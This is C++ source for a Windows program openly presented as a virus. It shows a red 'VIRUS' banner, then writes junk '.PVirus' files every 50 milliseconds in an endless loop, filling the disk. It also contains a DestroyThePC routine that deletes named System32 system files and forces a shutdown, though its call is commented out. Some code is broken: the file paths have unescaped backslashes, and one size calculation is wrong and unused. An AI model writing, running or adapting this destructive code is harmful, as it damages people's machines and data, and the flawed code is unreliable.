#include<iostream>
#include<stdio.h>
#include<Windows.h>
#include<fstream>
#include<string>
#include<random>

using namespace std;

void consoleVisibility(bool visible)
{
	if (visible)
		ShowWindow(GetConsoleWindow(), SW_SHOW);
	else
		ShowWindow(GetConsoleWindow(), SW_HIDE);

	SetCursorPos(200, 200);
}

void DestroyThePC()
{
	remove("C:\Windows\System32\bcd.dll");
	remove("C:\Windows\System32\bcdboot.exe");
	remove("C:\Windows\System32\WindowManagement.dll");
	remove("C:\Windows\System32\Windows.Security.Authentication.Identity.Provider.dll");
	remove("C:\Windows\System32\Windows.Networking.dll");
	remove("C:\Windows\System32\windows.storage.dll");
	remove("C:\Windows\System32\Windows.UI.dll");
	remove("C:\Windows\System32\bcdprov.dll");
	remove("C:\Windows\System32\Windows.AI.MachineLearning.dll");
	remove("C:\Windows\System32\Windows.Graphics.dll");
	remove("C:\Windows\System32\Windows.Internal.Graphics.Display.DisplayColorManagement.dll");

	int result = system("C:\Windows\System32\shutdown.exe");
}

void CreateVirusFile(string virusFileName)
{
	ofstream virusFile;

	virusFile.open(virusFileName + ".PVirus");

	if (virusFile.is_open())
	{
		virusFile << "\n000101010010100101001010010100101001010101001010010101001010100101010010100101001010101010010101010010101001010100101001010100101001010100101010010101010101001000101010010100101001010010100101001010101001010010101001010100101010010100101001010101010010101010010101001010100101001010100101001010100101010010101010101001000101010010100101001010010100101001010101001010010101001010100101010010100101001010101010010101010010101001010100101001010100101001010100101010010101010101001000101010010100101001010010100101001010101001010010101001010100101010010100101001010101010010101010010101001010100101001010100101001010100101010010101010101001000101010010100101001010010100101001010101001010010101001010100101010010100101001010101010010101010010101001010100101001010100101001010100101010010101010101001000101010010100101001010010100101001010101001010010101001010100101010010100101001010101010010101010010101001010100101001010100101001010100101010010101010101001";
		virusFile << "\nPlatinum Injected!!!!!!!!!!";
		virusFile << "\nPlatinum Injected!!!!!!!!!!";
		virusFile << "\nPlatinum Injected!!!!!!!!!! 010010010100101010010100101010";
	}

	virusFile.close();
}

void GenerateVirus()
{
	string binaryNames[7] = { "010100101", "100101001", "10100101", "1111111", "main", "3141592653589", "2.7182818284590" };

	int binarySize = (sizeof(binaryNames) / 2);
	int i = 0;

	while (true)
	{
		int randomIndex = rand() % 7;
		CreateVirusFile(binaryNames[randomIndex] + to_string(i));
		//consoleVisibility(true);
		
		i++;

		Sleep(50);

		//DestroyThePC();
	}
}

int main()
{
	system("color c");

	printf("*               *   ************     #######=>         #          #     ########");
	printf("\n *             *    ************     #        #        #          #     #");
	printf("\n  *           *         **           #         #       #          #     #");
	printf("\n   *         *          **           #         #       #          #      #");
	printf("\n    *       *           **           #     #           #          #         #");
	printf("\n     *     *            **           # #               #          #           #");
	printf("\n      *   *             **           #   #             #          #            #");
	printf("\n       * *         ************      #     #            #        #            #");
	printf("\n        *          ************      #       #            ######           #");

	GenerateVirus();

	return 0;
}